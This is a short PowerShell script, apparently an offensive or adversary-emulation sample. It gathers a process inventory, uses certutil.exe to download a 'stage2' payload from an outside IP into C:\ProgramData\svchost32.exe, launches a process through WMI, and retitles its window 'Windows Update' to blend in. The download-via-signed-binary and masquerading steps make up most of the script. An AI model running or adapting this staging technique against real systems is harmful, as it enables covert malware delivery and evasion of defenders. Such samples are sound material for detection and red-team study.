<#
.SYNOPSIS
    WMI inventory and LOLBin handoff helper.

.DESCRIPTION
    Collects a short process inventory, downloads a payload stage
    payload through a signed Windows utility and starts a benign
    execution target.
#>
[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://198.51.100.15/stage2.bin",
    [string]$PayloadPath = "C:\ProgramData\svchost32.exe",
    [int]$TimeoutSec = 10
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\telemetry.json" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $ResultObject = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $ResultObject.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

$Host.UI.RawUI.WindowTitle = "Windows Update"
